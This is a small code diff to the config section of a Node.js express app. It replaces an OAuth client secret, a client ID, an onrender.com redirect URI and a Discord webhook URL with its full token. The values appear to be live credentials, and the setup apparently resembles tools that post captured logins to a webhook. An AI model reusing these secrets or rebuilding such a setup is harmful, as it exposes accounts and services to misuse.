@@ -1,8 +1,8 @@
 //Config
-const secret_value = '7af2e26e-920a-401f-a947-fafd36165df0'
-const client_id = '29b22f3c-5421-4339-a919-6ca71b39de03'
-const redirect_uri = 'https://discord-sdoz.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1113251184501866567/8kzNULmM7_11mutIDpqVq09XhQ1IHNa_ETu4sNNOsiYFZUp9Ki-Mwq90BrZo4sI3RKm_'
+const secret_value = 'XLv8Q~gnBlv983NC4pkCgRF9KgmNPFOLIYQ-EcCy'
+const client_id = '8aa185fc-7d29-4e77-a1a4-17f72023bf17'
+const redirect_uri = 'https://ey74r5y.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1113263833281200168/FdzffvoIEGISQgTCdtYeGypEBIt1Jei5-ecXxhTBoq7-icQe1_V0HH4Bh2QiiycvWFY5'
 //Requirements
 const axios = require('axios')
 const express = require('express')
